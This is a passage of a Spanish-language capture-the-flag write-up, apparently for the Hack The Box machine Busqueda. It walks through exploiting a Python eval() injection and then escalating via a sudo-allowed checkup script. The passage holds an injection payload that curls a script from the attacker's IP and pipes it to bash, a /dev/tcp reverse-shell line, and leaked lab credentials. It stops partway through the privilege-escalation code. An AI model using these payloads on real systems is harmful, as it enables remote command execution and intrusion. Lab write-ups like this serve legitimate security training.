-&lt;p&gt;Podemos ver que se esta usando el metodo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval()&lt;/code&gt;, donde el primer argumento que recibe, el cual se le llama &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;expresion&lt;/code&gt;, es el input que nosotros le mandamos desde la pagina, al ver un poquito del metodo eval, encontre que la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;expresion&lt;/code&gt; es evaluada como una expresion de python, y el valor de retorno de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval()&lt;/code&gt;, es el resultado de evaluar la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;expresion&lt;/code&gt;. Si quieres saber mas has click &lt;a href=&quot;https://www.programiz.com/python-programming/methods/built-in/eval&quot;&gt;aqui&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;explotando-la-funcion-eval&quot;&gt;Explotando la funcion eval()&lt;/h2&gt;
-
-&lt;p&gt;Guiandome de este &lt;a href=&quot;http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html&quot;&gt;link&lt;/a&gt;, intentare ejecutar comandos en el servidor, cree un payload para mandarme una revese shell:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;',eval(&quot;__import__('&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;').system('&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;curl&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tu_IP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8086&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bash&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;')&quot;))#
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Y en mi archivo shell.html tengo esto:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;tu_IP&amp;gt;/443 0&amp;gt;&amp;amp;1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Ojo: puse el puerto 8086 por que el 8080 y el 80 los tengo ocupados&lt;/p&gt;
-
-&lt;p&gt;Y ya llego la reserve shell:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/busqueda/busqueda5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;flag-de-user&quot;&gt;Flag de user&lt;/h2&gt;
-
-&lt;p&gt;Si listamos el directorio, podemos ver que existe uno de .git:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-rw-r--r-- 1 www-data www-data 1.1K Dec  1 14:22 app.py
-drwxr-xr-x 8 www-data www-data 4.0K Apr 12 12:44 .git
-drwxr-xr-x 2 www-data www-data 4.0K Dec  1 14:35 templates
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Al listar el contenido, encontramos unas credenciales y un subdominio:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[core]
-	repositoryformatversion = 0
-	filemode = true
-	bare = false
-	logallrefupdates = true
-[remote &quot;origin&quot;]
-	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
-	fetch = +refs/heads/*:refs/remotes/origin/*
-[branch &quot;main&quot;]
-	remote = origin
-	merge = refs/heads/main
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Usuario: cody&lt;/p&gt;
-
-&lt;p&gt;Pass: jh1usoih2bkjaspwe92&lt;/p&gt;
-
-&lt;p&gt;Subdominio: gitea.searcher.htb&lt;/p&gt;
-
-&lt;p&gt;Al iniciar por SSH con cody, no nos deja, asi que tenemos que hacerlo con svc&lt;/p&gt;
-
-&lt;p&gt;Y ya tenemos la flag de user:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;svc@busqueda:~$ cat user.txt 
-9d73b3b689d79b82c42cce959*******
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;flag-de-root&quot;&gt;Flag de root&lt;/h2&gt;
-
-&lt;p&gt;Si buscamos por archivos que podamos ejecutar como root tenemos uno de python:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;svc@busqueda:~$ sudo -l
-[sudo] password for svc: 
-Matching Defaults entries for svc on busqueda:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
-
-User svc may run the following commands on busqueda:
-    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Al ejecutarlo, vemos que recibe varios argumentos:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
-Usage: /opt/scripts/system-checkup.py &amp;lt;action&amp;gt; (arg1) (arg2)
-
-     docker-ps     : List running docker containers
-     docker-inspect : Inpect a certain docker container
-     full-checkup  : Run a full system checkup
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Si vemos los contenedores de docker podemos ver varios:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
-CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
-960873171e2e   gitea/gitea:latest   &quot;/usr/bin/entrypoint…&quot;   3 months ago   Up 3 hours   127.0.0.1:3000-&amp;gt;3000/tcp, 127.0.0.1:222-&amp;gt;22/tcp   gitea
-f84a6b33fb5a   mysql:8              &quot;docker-entrypoint.s…&quot;   3 months ago   Up 3 hours   127.0.0.1:3306-&amp;gt;3306/tcp, 33060/tcp               mysql_db
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Al ver el contenido del contenedor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql_db&lt;/code&gt;, podemos ver unas credenciales:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/busqueda/busqueda6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En donde la contraseña de gitea es: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yuiu1hoiu4i5ho1uh&lt;/code&gt; y el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administrator&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez iniciados sesion en gitea y navegando un poco, encontre el script que estabamos ejecutando:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/bin/bash
-&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;actions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'full-checkup'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'docker-ps'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'docker-inspect'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capture_output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;
-
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;process_action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;action&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'docker-inspect'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;_format&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Format can't be empty&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-                &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;container&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;arg_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'docker'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'inspect'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'--format'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;container&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; 
-        
-        &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;IndexError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Usage: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; docker-inspect &amp;lt;format&amp;gt; &amp;lt;container_name&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    
-        &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Something went wrong'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    
-    &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;action&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'docker-ps'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;arg_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'docker'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'ps'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; 
-        
-        &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Something went wrong'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;action&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'full-checkup'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;arg_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./full-checkup.sh'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Done!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Something went wrong'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-            
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;action&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;action&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;process_action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;IndexError&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;IndexError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Usage: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &amp;lt;action&amp;gt; (arg1) (arg2)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'     docker-ps     : List running docker containers'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'     docker-inspect : Inpect a certain docker container'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'     full-checkup  : Run a full system checkup'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Donde vi vemos la opcion de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;full-checkup&lt;/code&gt; esta ejecutando un archivo sh:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;action&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'full-checkup'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;arg_list&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./full-checkup.sh'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run_command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arg_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Done!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
